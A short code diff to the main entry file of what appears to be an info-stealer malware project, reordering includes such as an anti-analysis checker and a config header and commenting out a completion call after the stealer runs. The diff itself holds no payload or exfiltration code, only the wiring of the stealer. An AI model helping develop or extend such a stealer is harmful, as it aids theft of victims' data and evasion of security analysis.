@@ -1,8 +1,9 @@
 #include "stealer/Stealer.h"
-#include "antianalysis/AntiAnalysisChecker.h"
 #include <locale>
 #include "windows.h"
 #include "utils/Utils.h"
+#include "Config.h"
+#include "antianalysis/AntiAnalysisChecker.h"
 
 void globalExceptionHandler() {
     try {
@@ -37,7 +38,8 @@ int main() {
 
     Stealer stealer;
     stealer.run();
-    stealer.complete();
+//    stealer.complete();
+
 
     return 0;
 }
